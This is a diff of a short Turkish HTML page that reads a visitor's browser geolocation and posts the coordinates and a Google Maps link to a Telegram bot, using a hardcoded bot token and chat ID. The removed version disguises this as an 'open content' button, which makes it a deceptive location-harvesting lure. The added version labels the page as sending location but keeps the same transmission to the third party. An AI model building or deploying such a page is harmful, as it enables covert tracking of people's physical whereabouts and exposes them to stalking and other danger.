@@ -1,49 +1,37 @@
 <!DOCTYPE html>
 <html>
   <head>
-    <title>Konum Gönderici</title>
+    <title>Konum Gönder</title>
   </head>
   <body>
-    <h2>İçeriğe ulaşmak için Butona Bas:</h2>
-    <button onclick="getLocation()">İÇERİĞİ AÇ</button>
+    <h2>Konum Gönder</h2>
+    <button onclick="getLocation()">📍 Gönder</button>
 
     <script>
       function getLocation() {
         if (navigator.geolocation) {
-          navigator.geolocation.getCurrentPosition(sendPosition, showError);
+          navigator.geolocation.getCurrentPosition(function(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+
+            fetch("https://api.telegram.org/bot7906946385:AAE_qvqTw8qxZBkdktkQNrXDM7maV6bdKqA/sendMessage", {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/json"
+              },
+              body: JSON.stringify({
+                chat_id: "6358000072",
+                text: `📍 LAT: ${lat}\n📍 LON: ${lon}\n📍 https://maps.google.com/?q=${lat},${lon}`
+              })
+            }).then(r => r.json())
+              .then(res => alert("Bot yanıtı: " + JSON.stringify(res)))
+              .catch(err => alert("Hata: " + err));
+          }, function(error) {
+            alert("Konum HATASI: " + error.message);
+          });
         } else {
-          alert("Tarayıcınız konum desteği vermiyor.");
+          alert("Tarayıcı konum desteklemiyor");
         }
-      }
-
-      function sendPosition(position) {
-        const lat = position.coords.latitude;
-        const lon = position.coords.longitude;
-
-        const url = "https://api.telegram.org/bot7906946385:AAE_qvqTw8qxZBkdktkQNrXDM7maV6bdKqA/sendMessage";
-        const data = {
-          chat_id: "6358000072",
-          text: `📍 Yeni konum:\n\nEnlem: ${lat}\nBoylam: ${lon}\nHarita: https://maps.google.com/?q=${lat},${lon}`
-        };
-
-        fetch(url, {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify(data)
-        })
-        .then(response => response.json())
-        .then(result => {
-          alert("Konum gönderildi!");
-        })
-        .catch(error => {
-          alert("Bir hata oluştu: " + error);
-        });
-      }
-
-      function showError(error) {
-        alert("Konum alınamadı: " + error.message);
       }
     </script>
   </body>
